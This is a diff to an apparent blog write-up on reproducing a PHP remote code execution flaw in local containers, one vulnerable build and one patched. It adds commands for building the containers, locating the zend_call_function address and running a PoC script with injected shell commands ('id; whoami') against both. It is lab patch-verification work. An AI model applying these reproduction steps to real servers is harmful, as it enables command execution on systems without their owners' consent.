@@ -108,7 +108,61 @@ The fact that PHP workers are long-lived and reuse memory between requests is wh
 
 ## What I Found in Testing
 
-I set up two isolated containers: PHP 8.3.35 (vulnerable) and PHP 8.3.36 (patched), both running Apache.
+I set up two isolated containers: PHP 8.3.35 (vulnerable) and PHP 8.3.36 (patched), both running Apache. Here's how to reproduce the environment locally:
+
+```bash
+# Build the vulnerable version (PHP 8.3.35)
+podman build -t php2shell-vulnerable -f vulnerable/Dockerfile vulnerable/
+
+# Build the patched version (PHP 8.3.36)
+podman build -t php2shell-patched -f patched/Dockerfile patched/
+
+# Run both side by side
+podman run -d --name php2shell-vuln -p 8080:80 php2shell-vulnerable
+podman run -d --name php2shell-patched -p 8081:80 php2shell-patched
+```
+
+Verify they're up:
+
+```bash
+curl http://localhost:8080/test.php
+# Expected: PHP 8.3.35 - vulnerable endpoint
+
+curl http://localhost:8081/test.php
+# Expected: PHP 8.3.36 - patched endpoint
+```
+
+The exploit requires finding the address of `zend_call_function` in the target binary:
+
+```bash
+podman exec php2shell-vuln sh -c "nm -D /usr/local/bin/php | grep zend_call_function"
+# Output: 000000000045bd4c T zend_call_function
+```
+
+Then run the PoC against the vulnerable instance:
+
+```bash
+python3 poc.py "http://localhost:8080/test.php" \
+    --call "0x45bd4c" \
+    --command "id; whoami; echo POC_SUCCESS_VULN" \
+    --stall 1.5
+```
+
+And against the patched instance to confirm the fix:
+
+```bash
+python3 poc.py "http://localhost:8081/test.php" \
+    --call "0x45bd4c" \
+    --command "id; whoami; echo POC_SUCCESS_PATCHED" \
+    --stall 1.5
+```
+
+When you're done, clean up:
+
+```bash
+podman rm -f php2shell-vuln php2shell-patched
+podman rmi php2shell-vulnerable php2shell-patched
+```
 
 **Key finding:** The exploit is highly version-specific. The public PoC was calibrated for PHP 8.5.4 on Ubuntu, with a symbol delta of `0x43EF0` to locate `zend_call_function`. My PHP 8.3.35 build had a different delta of `0xE034`.
 
